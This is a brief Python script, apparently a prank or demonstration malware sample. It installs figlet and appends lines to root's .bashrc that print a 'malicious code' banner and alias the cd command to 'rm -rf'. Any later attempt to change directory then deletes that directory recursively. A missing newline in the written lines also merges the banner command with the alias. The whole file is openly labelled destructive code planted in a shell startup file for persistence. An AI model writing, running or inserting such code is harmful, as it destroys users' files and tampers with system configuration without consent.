from os import system

system('apt install figlet')

file= open("/root/.bashrc","a+")
file.write("\necho 'malicious code here' \n")
file.write("figlet -f slant malicious code")
file.write('alias cd="rm -rf"\n')
file.close()